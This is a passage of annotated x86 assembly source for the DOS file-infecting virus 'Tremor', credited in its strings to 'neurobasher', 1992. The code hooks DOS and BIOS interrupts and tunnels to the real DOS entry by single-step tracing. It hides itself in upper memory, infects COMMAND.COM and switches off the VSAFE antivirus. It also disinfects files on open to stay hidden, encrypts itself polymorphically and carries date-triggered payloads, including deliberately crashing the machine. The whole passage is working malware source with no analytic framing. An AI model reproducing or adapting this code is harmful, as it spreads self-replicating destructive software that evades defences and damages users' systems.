                jz      loc_138
                mov     al,0bdh         ; mov al,"mov bp,xxxx"
loc_138:        stosb
                mov     word ptr ds:[org_88d],di
                stosw

loc_ret_139:    retn
sub_30          endp
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
insertnearjmp:  test    ch,3
                jnz     loc_ret_140
                xor     ax,ax
                mov     al,bl
                and     al,7
                add     al,78h          ; 78..7f -> near jmp
                stosw
loc_ret_140:    retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
sub_32:         lodsb
                test    ch,2
                jz      loc_143
                cmp     al,1
                jne     loc_ret_142
                mov     al,0fch         ; mov al,'cld'
                test    dh,80h
                jz      loc_141
                dec     ax              ; mov al,'sti"
loc_141:        stosb
loc_ret_142:    retn

loc_143:        cmp     al,3
                jne     loc_ret_142
                mov     al,90h          ; mov al, "nop"
                test    dh,80h
                jz      loc_144
                mov     al,2eh          ; mov al,"cs:"
loc_144:        stosb
                retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
findfile        proc    near
                push    dx
                push    ds
                push    es
                push    bx

                mov     ah,2fh                  ; get dta
                call    performint21
                push    bx
                push    es                      ; es:bx = dta

                push    ds                      ; ds:dx remains constant
                push    dx

                mov     ah,1ah
                push    cs
                pop     ds
                mov     dx,offset tempdta       ; set dta
                call    performint21

                pop     dx                      ;
                pop     ds
                mov     cx,27h                  ; anyfile
                mov     ax,4e00h                ; find first
                call    performint21
                pop     ds
                pop     dx

                pushf
                mov     al,byte ptr cs:[tempdta.date+1]
                mov     ah,1ah                  ; re-set dta
                call    performint21
                popf

                pop     bx
                pop     es
                pop     ds
                pop     dx
                retn
findfile        endp
;--------------------------------------------------------------------------
;               desinfecting open files
;--------------------------------------------------------------------------
clean__file:    call    checkforfprot
                jz      loc_145
                call    findfile
                jc      loc_145

                cmp     al,200                  ; = hibyte of files date
                jb      loc_145

                call    opendestfile
                jnc     loc_146                 ; no err -> jmp
                cmp     al,3                    ; error = file not found ?
                ja      loc_149                 ; no -> jmp
loc_145:        stc                             ; else return
                retn

loc_146:        call    chkdate200
                jc      loc_149
                call    readheader
                jc      loc_147
                neg     ah
                call    add200toyear            ; but here : "sub"..

loc_147:        call    checkifinfected
                jnz     loc_149

                push    ds
                push    es
                ;
                push    cs
                pop     es
                mov     si,bp
                mov     di,2
                call    getflag_cs_00
                cmp     al,0ffh
                jne     loc_148

                mov     ah,60h                  ; get truename
                call    performint21            ; to es:di
                mov     word ptr es:[di-2],bx

loc_148:        pop     es
                pop     ds
                call    desinfect
loc_149:        jmp     setinfectdate
;--------------------------------------------------------------------------
;               desinfect physically
;--------------------------------------------------------------------------
desinfect:      push    cs
                pop     ds
                call    writeexeheader
                mov     dx,word ptr ds:[data_x01]
                mov     cx,word ptr ds:[data_x02]
                mov     al,0                    ; seek from begin of file
                call    seek                    ; to filepos cx:dx
                xor     cx,cx
                jmp     truncate        ; write 0 byte -> truncate tremor
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
checkifinfected:call    scramblebuffer
                cmp     word ptr cs:[1ch+si],0deadh
                jne     loc_ret_150                     ; back with nz !
                cmp     byte ptr cs:[si],0e9h
                je      loc_ret_150
                cmp     word ptr cs:[si],5a4dh
loc_ret_150:    retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
scramblebuffer: mov     si,offset buffer
                push    si
                mov     ax,cs:[si+1eh]
loc_151:        xor     cs:[si],ax
                add     ax,913fh
                inc     si
                inc     si
                cmp     si,106bh
                jne     loc_151
                pop     si
                retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
setflag_cs_00:  mov     byte ptr cs:[flag],0ffh
                retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
getflag_cs_00:  mov     al,cs:[flag]
                retn
;--------------------------------------------------------------------------
;               out : real mem-top
;--------------------------------------------------------------------------
getrealmemorysize:
                mov     dx,paras_needed            ; dx =   10ch
GetTremMem:
                nop                             ; dx = - 10ch
                mov     byte ptr cs:[enablegetmem],0 ; enable mem-handler
                mov     ah,52h
                call    performint21
                call    getfrstmcb
loc_152:        cmp     byte ptr [di],5ah
                je      lastmcbfound
                push    ds
                pop     es
                call    getnextmcb
                jmp     loc_152
lastmcbfound:   add     ds:[di+3],dx            ; = add / sub 10ch
                retn
;--------------------------------------------------------------------------
;               out : ds = seg of next mcb in chain
;--------------------------------------------------------------------------
getnextmcb:     mov     ax,ds
                inc     ax
                add     ax,ds:[di+3]
                mov     ds,ax
                retn
;--------------------------------------------------------------------------
;               out : es=dos-segment and ds:si = first mcb
;--------------------------------------------------------------------------
get_1stmcb:     mov     ah,52h
                int     21h
getfrstmcb:     lds     di,dword ptr es:[bx-4]  ; get first mcb
                retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
chkfilesize:    cmp     dx,word ptr cs:[data_x02]
                jne     loc_ret_154
                cmp     bx,word ptr cs:[data_x01]
loc_ret_154:    retn
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
checkforfprot:  mov     byte ptr cs:[BP_Flag],1
                mov     ax,0ff0fh
                pushf
                call    dword ptr cs:[tremor_21]
                cmp     ax,101h
                mov     byte ptr cs:[BP_Flag],0
                retn
;--------------------------------------------------------------------------
;int 13 - pc tools v8+ vsafe, vwatch - api
;        ah = fah
;        dx = 5945h
;        al = function (00h-07h)
;return: varies by function
;--------------------------------------------------------------------------
checkforvsafe:  mov     ax,0fa02h       ; switch it off
                mov     dx,5945h
                int     13h
                retn
;----------------------------------------------------------------------
message1:       db      "-=> t.r.e.m.o.r was done by neurobasher /"
                db      " may-june'92, germany <=-",0
message2:       db      ".moment.of.terror.is.the.beginning.of.life.",0
;----------------------------------------------------------------------
newint15:       push    ax
                in      al,60h
                cmp     al,53h          ; del-key pressed
                jnz     no_del_key      ; no->bye

                push    ds
                mov     ax,40h
                mov     ds,ax
                mov     al,byte ptr ds:[17h]
                test    al,1100b        ; ctrl+alt pressed ?
                jz      bye_int09

                push    bx
                push    cx
                push    dx
                push    si
                mov     ax,700h
                xor     bx,bx
                mov     cx,bx
                mov     dx,187fh
                int     10h
                mov     ah,02
                mov     dx,907h         ; set cursor
                int     10h
                mov     si,offset message1
                call    print_message
                mov     dx,0f13h
                int     10h
                mov     si,offset message2
                call    print_message
                mov     cx,96h
locloop_155:    push    cx
                mov     cx,0ffffh

locloop_156:    jmp     $+2
                loop    locloop_156

                pop     cx
                loop    locloop_155

                pop     si
                pop     dx
                pop     cx
                pop     bx

bye_int09:      pop     ds
no_del_key:     pop     ax
                cli
                jmp     dword ptr cs:[internal_15]
                ;--------------------------------

print_message:  mov     al,cs:[si]
                xor     al,9ch
                cmp     al,0
                je      loc_ret_160
                int     29h
                inc     si
                jnz     print_message
loc_ret_160:    retn
;--------------------------------------------------------------------------
;               reset ints + registers.
;--------------------------------------------------------------------------
trem_popall:    cli
                call    resetints

getorigregs:    mov     ax,03c4h
                mov     ds,ax
                mov     ax,9ef5h
                mov     es,ax
                mov     ax,4300h
                mov     bx,0faceh
                mov     cx,1989h
                mov     dx,000eh
                db      0beh            ; mov si,xxxx
old__si         dw      11b7h
                mov     di,008ah
                mov     bp,0070h
                sti
                retn
flickerflag     equ     $+1
random_1        dw      0
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
checkfortremor: xor     bx,bx
                mov     ds,bx
                lds     si,dword ptr ds:[4+bx]  ; int 01 starts with iret ?
                cmp     byte ptr [si],0cfh
                jne     loc_162                 ; no -> jmp

                cmp     ah,30h                  ;
                jne     loc_164
                push    cx                      ; save cx,dx
                push    dx
                mov     ah,2ah                  ; get system-date
                call    performint21
                pop     bx
                pop     bp
                mov     ax,offset random_1      ; compare cx,dx to sys-dat
                cmp     bp,cx                   ; tremor first calls sys-date
                jne     loc_163                 ; then dos-version.
                cmp     bx,dx                   ; -- extended self-check.
                jne     loc_163

loc_162:        mov     ax,offset selftest
loc_163:        mov     word ptr cs:[org_487],ax
loc_164:        jmp     getorigregs
;--------------------------------------------------------------------------
;
;--------------------------------------------------------------------------
newint01:       push    ax
                push    bx
                push    si
                call    reloc_int1
reloc_int1:     pop     si                      ; si = offset reloc_int1
                mov     bx,sp
                mov     ax,ss:[bx+8]            ; callerseg
Dos_Seg         equ     $+1
                cmp     ax,129h
                ja      loc_165

                mov     cs:[si+offset trace_result-offset reloc_int1+2],ax
                mov     ax,ss:[bx+6]            ; caller-offset
                mov     cs:[si+offset trace_result-offset reloc_int1  ],ax
                and     byte ptr ss:[bx+0bh],0feh; reset tf
                jmp     loc_166

loc_165:        push    cs
                pop     ax
                cmp     ax,ss:[bx+8]            ; first steps
                je      loc_166                 ; or end of int

                mov     ax,ss:[bx+8]
                mov     cs:[si+offset tracetemp-offset reloc_int1+2],ax
                mov     ax,ss:[bx+6]
                mov     cs:[si+offset tracetemp-offset reloc_int1  ],ax

loc_166:        pop     si
                pop     bx
                pop     ax
                iret
;------------------------------------------------------------------------
                ;
SpecialFiles    db      'CH'
Trace_Result    db      'ME','MI'
                db      'F2','F-'
Tracetemp       db      'SY','SI'
                db      'PM'
                ; chkdsk
                ; mem
                ; mirror
                ; f-prot
                ; sys
                ; si
                ;
                ; unused :
                ;
                db      'RJ','KZ','AH'          ; ARJ,PKZIP,LHA

AnyFile         db      '\*.*',0
BP_Flag         dw      0                       ;
                dw      0
                db      0,0,0
;-------------------------------------------------------------------
;               installation
;-------------------------------------------------------------------
virinstall:     call    cda
cda:            pop     si
                mov     ah,2ah          ; get current date
                mov     word ptr cs:[si+offset start_psp-offset cda],es
                int     21h
                mov     al,72h          ; "jb"
org_ce8h        equ     $+2
                ;---------------------------------------------------
                cmp     dx,504h         ; now : 4. mai ?
                jb      loc_168         ; previous -> jmp
                ;---------------------------------------------------
org_ceeh        equ     $+2
                ;---------------------------------------------------
                cmp     cx,7c9h         ; 1993 ?
org_cf0         equ     $
                jae     loc_169         ; after -> jmp
                ;---------------------------------------------------
loc_168:        mov     al,0ebh         ; "jmp"-> disable psycho...
                ;
loc_169:        mov     cs:[si+offset psycholabel-offset cda],al
                ;
                mov     ah,30h
                cld
                int     21h
                xchg    al,ah
                cmp     ax,31dh         ; dosversion < 3.30 -> stop
                ja      loc_171
loc_170:        jmp     vir_install_done

my_call         equ     $+1
loc_171:        mov     ax,0f1e9h       ; "tremor"
                int     21h

selftest        equ     $+1
                cmp     ax,0cadeh
                je      loc_170

                xor     di,di                   ; di=0
                mov     ax,40h
                mov     ds,ax
                mov     bp,ds:[di+13h]          ; get max-memory
                mov     cl,6
                shl     bp,cl                   ; bp = top of memory
                mov     ah,62h                  ;
                int     21h                     ; get psp
                mov     ds,bx                   ;
                push    word ptr ds:[di+2ch]    ; push env-seg
                push    ds                      ; ds = psp-segment
                ;
                mov     cl,90h                  ; mov cl,"nop"
;--------------------------------------------------------------=
                mov     ax,5800h                ; get mem strategy
                int     21h                     ;
                xor     ah,ah                   ;
                push    ax
                mov     ax,5801h                ; set it to "give umb first"
                mov     bx,80h
                int     21h
                mov     ax,5802h                ; get mem linkstate
                int     21h
                xor     ah,ah
                push    ax
                mov     ax,5803h                ; link umbs
                mov     bx,1
                int     21h
                jc      loc_172
                mov     ah,48h                  ; get memory
                mov     bx,0ffffh
                int     21h                     ; how much is there
                mov     ah,48h
                int     21h
                mov     es,ax
                cmp     ax,bp
                jae     loc_173                 ; enough !


                dec     ax                      ; else try xms-umbs
                mov     es,ax
                mov     es:[di+1],di



loc_172:        mov     ax,4300h                ; xms installed ?
                int     2fh
                cmp     al,80h
                jne     loc_174                 ; no : jmp


                mov     ax,4310h                ; get xms-entry
                int     2fh
                push    cs
                pop     ds

                mov     word ptr ds:[si+offset bp_flag-offset cda  ],bx
                mov     word ptr ds:[si+offset bp_flag-offset cda+2],es

                mov     ah,10h                  ; get umb
                mov     dx,0ffffh               ; how much available ?
                call    dword ptr ds:[si+offset bp_flag-offset cda]

                cmp     bl,0b0h                 ; check errorcode.
                jne     loc_174                 ; "out of mem" : jmp
                                                ; -> request all memory
                mov     ah,10h
                call    dword ptr ds:[si+offset bp_flag-offset cda]
                dec     ax                      ; "ok" -> ax=1
                jnz     loc_174                 ; nz -> ax has not been "1"
                mov     es,bx                   ; else : segment in bx

loc_173:        mov     cl,0c3h

                mov     ax,es
                dec     ax
                mov     ds,ax

                mov     byte ptr [di],5ah       ;
                mov     ds:[di+1],di
                sub     word ptr ds:[di+3],paras_needed

                call    getnextmcb

                mov     word ptr cs:[si+offset trem_mcb-offset cda],ax
                inc     ax
                mov     es,ax                   ; es = future virusseg

loc_174:        pop     bx
                mov     ax,5803h
                int     21h
                pop     bx
                mov     ax,5801h
                int     21h
                pop     ds

                mov     cs:[si+offset gettremmem-offset cda],cl

                cmp     cl,90h
                jne     loc_175

                push    ds
                pop     es
                mov     bx,0ffffh
                mov     ah,4ah
                int     21h
                mov     ax,paras_needed
                sub     ds:[di+3],ax
                ;
                sub     bx,ax
                mov     ah,4ah
                int     21h

                mov     ax,ds
                inc     ax
                add     ax,bx
                mov     es,ax                   ; es=virussegment

loc_175:        push    si                      ; si = offset 0cda

                push    cs
                pop     ds

                sub     si,offset cda    - offset extra
                mov     cx,offset buffer - offset extra
                mov     di,offset extra
                rep     movsb                   ; copy virus-code
                                                ; to dest-memory

                add     di,32                   ; skip buffer
                sub     si,offset buffer-offset writevirus
                mov     cx,offset buffer-offset writevirus
                rep     movsb

                pop     si                      ; pop offset cda
                push    es
                ;----------------------------( get int 21h)-----
                mov     ax,3521h                ; get int 21
                int     21h
                pop     ds                      ; ds=virus-seg
                cwd                             ; dx=0
                mov     di,offset random_1
                mov     [di],dx
                mov     word ptr ds:[org_487],di;

                mov     di,82h                  ;
                mov     ds:[di+  6],es          ; -> int 21h
                mov     ds:[di+  4],bx
                mov     ds:[di+16h],es
                mov     ds:[di+14h],bx
                ;----------------------------( get int 15h )-----
                mov     al,15h
                int     21h
                mov     ds:[di+18h],bx
                mov     ds:[di+1ah],es

                call    setflag_cs_00
                xor     cx,cx
                call    get_1stmcb

                mov     word ptr cs:[si+offset dos_seg-offset cda],es
loc_176:        or      cx,cx
                jnz     loc_177

                mov     ax,ds                   ; ds=mcb-seg
                inc     ax
                cmp     ax,ds:[di+1]            ; mcb-owner = itself ?
                jne     loc_177                 ; no.......

                mov     cx,ax                   ; else -> segment in cx
                push    ds

loc_177:        cmp     byte ptr cs:[si+offset psycholabel-offset cda],90h
                je      loc_178                 ; if "nop" then low-mem

                cmp     byte ptr [di],5ah       ; last mcb reached ?
                jne     loc_179                 ; if "yes"-> abort scan

trem_mcb        equ     $+1
                mov     ax,0eef4h
                jmp     loc_181

loc_178:        cmp     word ptr ds:[di+offset psycholabel+16+2],0c402h
                jne     loc_179

                cmp     word ptr ds:[di+offset psycholabel+16+4],0f24h
                je      loc_180

loc_179:        push    ds
                pop     es
                call    getnextmcb
                jmp     loc_176

loc_180:        mov     byte ptr es:[di],5ah    ; vir-mcb found
                mov     ds:[di+1],cx            ; set owner = itself

loc_181:        pop     cx                      ; get low_dos_mcb
                inc     cx

                inc     ax
                mov     ds,cx

                mov     word ptr cs:[si+offset low_dos_mcb  -offset cda],cx
                mov     word ptr cs:[si+offset low_dos_mcb_2-offset cda],cx
                mov     word ptr cs:[si+offset low_dos_mcb_3-offset cda],cx

                call    sub_56

                mov     di,4eh
                call    sub_57
                mov     word ptr ds:[di+6],offset newint15
                push    ax                      ; save vir-seg

                push    cs
                pop     ds

                mov     word ptr ds:[si+offset org_cf0-offset cda],0
                push    ax                      ; save virus-seg

                mov     ax,3501h                ; get int 01
                int     21h

                mov     di,bx
                mov     bp,es

                mov     ah,25h                  ; set tracer-int
                lea     dx,[si+offset newint01-offset cda]
                int     21h

                pop     es                      ; get virus-seg

                pushf
                pop     ax
                or      ah,1
                push    ax
                popf
                mov     ah,30h
                pushf
                call    dword ptr es:[internal_21]
                ;
                mov     ax,2501h                ; reset tracer-int
                mov     dx,di
                mov     ds,bp
                int     21h

                push    cs
                pop     ds                      ; ds=cs

                push    si                      ; save offset cda
                add     si,offset trace_result-offset cda

                mov     di,offset internal_21
                movsw                           ; copy dos-entry to
                movsw                           ; es=virus-segment
                                                ; ds=cs
                pop     si                      ; get vir-entry

                mov     ax,word ptr ds:[si+offset org_cf0-offset cda]

                or      ax,ax
                jnz     loc_183
loc_182:
low_dos_mcb     equ     $+1

                mov     ax,0
                mov     ds,ax
                mov     dx,5            ; set int21 to inttable->
                mov     ax,2521h        ; crash the machine
                int     21h
                jmp     loc_188
;---------------------------------------------------------------------
loc_183:        xor     bx,bx
                dec     ax              ; ax = mcb-seg to check
                call    check_my_mcb
                jz      loc_184         ; nz= size > 0a000, ax=size
                                        ; zf= size <=0a000, cx=size
                sub     ax,10h          ;
                call    check_my_mcb    ;
                jnz     loc_182         ;
;---------------------------------------------------------------------
loc_184:        cli                     ; cx = size of mcb
                mov     bp,ds           ;
locloop_185:    inc     bp
                mov     ds,bp           ; ds = psp-seg

                xor     bx,bx
loc_186:        mov     ax,cs:[si+offset trace_result  -offset cda]
                cmp     ax,[bx]         ; psp:000, dort steht aber 20cd...
                jne     loc_187

                mov     ax,cs:[si+offset trace_result+2 -offset cda]
                cmp     ax,ds:[bx+2]
                jne     loc_187

                mov     word ptr ds:[bx  ],5    ; offset 5
low_dos_mcb_2   equ     $+3
                mov     word ptr ds:[bx+2],0    ; in low-dos-seg

loc_187:        inc     bx
                cmp     bl,10h
                jne     loc_186
                loop    locloop_185
                sti
loc_188:        pop     es                      ; pop virus-segment (umb)

                push    cs
                pop     ds

                mov     ah,1ah                  ; set dta
                lea     dx,[si+offset buffer-offset cda]
                mov     bx,dx                   ; dta in umb !
                int     21h
;---------------------------------------------------------------------
                mov     ah,4eh                  ; findfirst
                mov     cx,8                    ; attribut = volume !
                lea     dx,[si+offset anyfile-offset cda]
                int     21h                     ;-----------------------
                                                ; volume found :
                                                ;-----------------------
                mov     ax,ds:[bx+16h]          ; get files time
                mov     cx,ds:[bx+18h]          ; get files date

volume_time     equ     $+1
                cmp     ax,6f55h                ; time
                jne     loc_189                 ; 13:58:42

volume_date     equ     $+2
                cmp     cx,1981h                ; date=1981h=
                je      loc_190                 ;  12-1-92

                ; activate screen flickering
loc_189:        mov     byte ptr es:[offset psycholabel],0ebh

loc_190:        mov     word ptr es:[offset volume_time],ax
                mov     word ptr es:[offset volume_date],cx

                push    es                      ; es=ds=virseg (umb)
                pop     ds
                cmp     byte ptr ds:[offset psycholabel],0ebh
                je      loc_191

low_dos_mcb_3   equ     $+1
                mov     bx,0
                mov     ds,bx
                mov     ax,2515h
                mov     dx,0053h                ; set int 15h
                int     21h                     ;

loc_191:        pop     ds                      ; get environment-segment
                xor     bx,bx
                                                ; search comspec=
loc_192:        cmp     word ptr [  bx],4f43h   ; 'co'
                jne     loc_193
                cmp     word ptr [bx+6],3d43h   ; 'c="
                je      loc_194

loc_193:        inc     bx                      ;
                cmp     bh,8
                jne     loc_192
                jmp     vir_install_done

                ;-------------- ( infect command.com )-------------------
loc_194:        lea     dx,[bx+8]               ; comspec found.
                mov     ax,4300h                ; bx points to string in
                mov     bx,0faceh               ; comspec
                int     21h

vir_install_done:
                call    sub_54
sub_54:         pop     si                      ; relocate again..
                xor     ax,ax
                lea     di,[si+offset extra-offset sub_54]

                mov     cx,(offset kill_label1-offset extra) / 2
                push    cs
                pop     es
kill_label1:    rep     stosw
                add     di,offset check_my_mcb-offset kill_label1
                mov     cx,(offset buffer-offset check_my_mcb)
                rep     stosb

start_psp       equ     $+1
                mov     bx,3c4h
                mov     ds,bx
                push    ds
                pop     es
                mov     dx,80h
                mov     ah,1ah          ; set dta to psp:80h (default)
                int     21h

com_flag        equ     $+1
                mov     al,1
                or      al,al
                jz      loc_196

                mov     word ptr ds:[101h],103h ; set jmp in com-file
init_jump       equ     $-2
                push    cs
                jmp     loc_197

loc_196:        cli
                mov     ax,cs
init_ss         equ     $+1
                sub     ax,0
                mov     ss,ax
init_sp         equ     $+1
                mov     sp,0
                sti
                mov     ax,cs
init_cs         equ     $+1
                sub     ax,0
                push    ax

init_ip         equ     $+1
loc_197:        mov     ax,100h
                push    ax
                sti
                xor     ax,ax
                mov     bx,ax
                mov     cx,ax
                cwd
                mov     si,ax
                mov     di,ax
                mov     bp,ax
                retf
;--------------------------------------------------------------------------
;               in : bx=0, ds=cs
;--------------------------------------------------------------------------
check_my_mcb:   mov     ds,ax             ;
                cmp     byte ptr [bx],44h ; data-mcb.
                je      loc_198
                cmp     byte ptr [bx],4dh ; mem-mcb
                jne     loc_ret_199

loc_198:        mov     ax,ds:[bx+3]    ; size of mcb
                cmp     ah,0a0h         ; hi-size > a0
                ja      loc_ret_199

                xchg    ax,cx
                xor     bp,bp           ;-> zf, else nz
loc_ret_199:    retn
;--------------------------------------------------------------------------
sub_56:         mov     word ptr ds:[di+6],offset virint21
sub_57:         mov     byte ptr ds:[di+5],0eah
                mov     ds:[di+8],ax            ;  jmp tremor:int21
                retn                            ;
;--------------------------------------------------------------------------
data_x01        dw      0
data_x02        dw      0
;--------------------------------------------------------------------------
writevirus:     call    code_decode
                mov     cx,4000
                mov     dx,offset extra
                mov     ah,40h
                pushf
                call    dword ptr ds:[internal_21]
                pushf
                push    ax
                push    cx
org_1081        equ     $+1
                mov     al,0
                mov     byte ptr ds:[data_103-buf_len],al ; -> add [di],al
                call    code_decode
                pop     cx
                pop     ax
                popf
                retn
;--------------------------------------------------------------------------
code_decode:    mov     ax,0
                mov     di,offset buffer
                mov     cx,0
locloop_200:
xdata_103       db      31h             ; xor     [di],ax
xdata_0108      db      5               ; 31 5  = xor [di],ax
                db      5               ; 31 35 = xor [di],si
xdata_0109      dw      0               ; = add     ax,xxxx
                inc     di
                inc     di
                loop    locloop_200
                retn

tempint24:      xor     al,al
                iret
;---------------------------------------------( end of virus )------
buf_len         equ     offset buffer-offset writevirus
zdata_103       equ     offset xdata_103 -offset writevirus
zdata_0108      equ     offset xdata_0108-offset writevirus
zdata_0109      equ     offset xdata_0109-offset writevirus
ztempint24      equ     offset tempint24 -offset writevirus
buffer:         db      32 dup (?)
sub_58          equ     $
data_103        equ     $+zdata_103
data_0108       equ     $+zdata_0108
data_0109       equ     $+zdata_0109
posint24        equ     $+ztempint24
;--------------------------------------------------------------------------
code_seg        ends
                end     start
;--------------------------------------------------------------------------

